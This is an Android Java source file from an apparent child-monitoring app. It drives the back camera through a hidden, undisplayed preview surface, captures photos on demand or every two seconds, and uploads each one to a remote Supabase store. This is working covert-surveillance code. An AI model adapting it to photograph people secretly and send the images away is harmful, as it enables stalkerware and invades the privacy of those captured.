package com.familycontrol.child;

import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;

public class CameraManager {
    
    private static final String TAG = "CameraManager";
    private static final int MAX_PREVIEW_WIDTH = 1920;
    private static final int MAX_PREVIEW_HEIGHT = 1080;
    
    private Context context;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private String cameraId;
    private Size previewSize;
    private SupabaseClient supabaseClient;
    private boolean isStreaming = false;
    
    public CameraManager(Context context) {
        this.context = context;
        this.supabaseClient = new SupabaseClient(context);
    }
    
    public void captureImage() {
        try {
            startBackgroundThread();
            openCamera();
            
            // Wait a moment for camera to initialize
            backgroundHandler.postDelayed(() -> {
                takePicture();
            }, 1000);
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing image", e);
        }
    }
    
    public void startCameraStream() {
        try {
            if (!isStreaming) {
                startBackgroundThread();
                openCamera();
                isStreaming = true;
                
                // Start continuous capture for streaming
                backgroundHandler.postDelayed(() -> {
                    startContinuousCapture();
                }, 1000);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting camera stream", e);
        }
    }
    
    public void stopCameraStream() {
        isStreaming = false;
        closeCamera();
        stopBackgroundThread();
    }
    
    private void startBackgroundThread() {
        if (backgroundThread == null) {
            backgroundThread = new HandlerThread("CameraBackground");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
        }
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }
    
    private void openCamera() {
        try {
            android.hardware.camera2.CameraManager manager = 
                (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            
            // Get back camera
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
            
            if (cameraId == null) {
                Log.e(TAG, "No back camera found");
                return;
            }
            
            // Set up image reader
            CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size largest = Collections.max(Arrays.asList(map.getOutputSizes(ImageFormat.JPEG)),
                new CompareSizesByArea());
            
            imageReader = ImageReader.newInstance(largest.getWidth(), largest.getHeight(),
                ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(onImageAvailableListener, backgroundHandler);
            
            // Open camera
            manager.openCamera(cameraId, stateCallback, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Error opening camera", e);
        }
    }
    
    private void closeCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
    
    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(CameraDevice camera) {
            cameraDevice = camera;
            createCameraPreviewSession();
        }
        
        @Override
        public void onDisconnected(CameraDevice camera) {
            camera.close();
            cameraDevice = null;
        }
        
        @Override
        public void onError(CameraDevice camera, int error) {
            camera.close();
            cameraDevice = null;
            Log.e(TAG, "Camera error: " + error);
        }
    };
    
    private void createCameraPreviewSession() {
        try {
            // Create a dummy surface for preview (required but not displayed)
            SurfaceTexture texture = new SurfaceTexture(10);
            texture.setDefaultBufferSize(previewSize != null ? previewSize.getWidth() : 640,
                previewSize != null ? previewSize.getHeight() : 480);
            Surface surface = new Surface(texture);
            
            cameraDevice.createCaptureSession(Arrays.asList(surface, imageReader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(CameraCaptureSession session) {
                        if (cameraDevice == null) return;
                        captureSession = session;
                        
                        try {
                            CaptureRequest.Builder requestBuilder = 
                                cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                            requestBuilder.addTarget(surface);
                            
                            captureSession.setRepeatingRequest(requestBuilder.build(), null, backgroundHandler);
                        } catch (Exception e) {
                            Log.e(TAG, "Error setting up preview", e);
                        }
                    }
                    
                    @Override
                    public void onConfigureFailed(CameraCaptureSession session) {
                        Log.e(TAG, "Camera configuration failed");
                    }
                }, null);
                
        } catch (Exception e) {
            Log.e(TAG, "Error creating camera preview session", e);
        }
    }
    
    private void takePicture() {
        if (cameraDevice == null || captureSession == null) return;
        
        try {
            CaptureRequest.Builder captureBuilder = 
                cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            
            // Auto focus and flash
            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
            
            captureSession.capture(captureBuilder.build(), null, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Error taking picture", e);
        }
    }
    
    private void startContinuousCapture() {
        if (!isStreaming) return;
        
        takePicture();
        
        // Schedule next capture for streaming (every 2 seconds)
        backgroundHandler.postDelayed(() -> {
            if (isStreaming) {
                startContinuousCapture();
            }
        }, 2000);
    }
    
    private final ImageReader.OnImageAvailableListener onImageAvailableListener = 
        new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader reader) {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    
                    // Save image to temporary file
                    String fileName = "capture_" + System.currentTimeMillis() + ".jpg";
                    File imageFile = new File(context.getCacheDir(), fileName);
                    
                    try (FileOutputStream output = new FileOutputStream(imageFile)) {
                        output.write(bytes);
                    }
                    
                    // Upload to Supabase
                    supabaseClient.uploadFile(fileName, imageFile.getAbsolutePath(), "image");
                    
                    // Delete temporary file
                    imageFile.delete();
                    
                    Log.d(TAG, "Image captured and uploaded: " + fileName);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error processing captured image", e);
                } finally {
                    if (image != null) {
                        image.close();
                    }
                }
            }
        };
    
    private static class CompareSizesByArea implements Comparator<Size> {
        @Override
        public int compare(Size lhs, Size rhs) {
            return Long.signum((long) lhs.getWidth() * lhs.getHeight() -
                (long) rhs.getWidth() * rhs.getHeight());
        }
    }
}

